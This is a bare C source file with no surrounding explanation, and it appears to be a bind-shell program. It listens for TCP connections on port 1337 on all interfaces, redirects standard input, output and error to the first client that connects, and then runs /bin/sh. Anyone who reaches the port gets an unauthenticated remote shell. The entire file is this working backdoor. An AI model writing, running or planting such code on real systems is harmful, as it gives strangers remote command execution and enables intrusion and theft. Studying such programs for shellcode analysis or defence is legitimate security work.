#include <stdio.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

int host_sockid, client_sockid, status, num_bytes, clientaddr_size;
	
struct sockaddr_in hostaddr, clientaddr;

int main()
{
	host_sockid = socket(PF_INET, SOCK_STREAM, 0);

	hostaddr.sin_family = AF_INET;
	hostaddr.sin_port = htons(1337);
	hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);

	bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));
	
	listen(host_sockid, 5);

	clientaddr_size = sizeof(clientaddr);
	client_sockid = accept(host_sockid, (struct sockaddr*) &clientaddr, &clientaddr_size);

	dup2(client_sockid, 0);
	dup2(client_sockid, 1);
	dup2(client_sockid, 2);

	execl("/bin/sh","sh", NULL);
	status  = close(host_sockid);
	
	return 0;
}
